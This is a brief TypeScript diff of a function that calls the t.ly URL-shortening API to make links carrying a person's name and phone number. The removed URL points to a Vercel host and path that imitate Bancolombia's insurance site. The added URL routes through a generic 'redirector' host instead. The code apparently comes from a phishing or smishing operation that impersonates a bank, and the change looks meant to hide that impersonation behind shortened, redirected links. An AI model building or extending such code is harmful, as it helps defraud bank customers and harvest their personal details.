@@ -1,7 +1,7 @@
 export const createShortURL = async (name: string | null, phone: string) =>
   await fetch('https://api.t.ly/api/v1/link/shorten', {
     body: JSON.stringify({
-      long_url: `personas-seguro-sucursal-personas.vercel.app/bancolombia/seguro?${
+      long_url: `https://redirector-mocha-mu.vercel.app/?${
         name ? `name=${name}` : ''
       }&phone=${phone}`,
       domain: 'https://t.ly/',
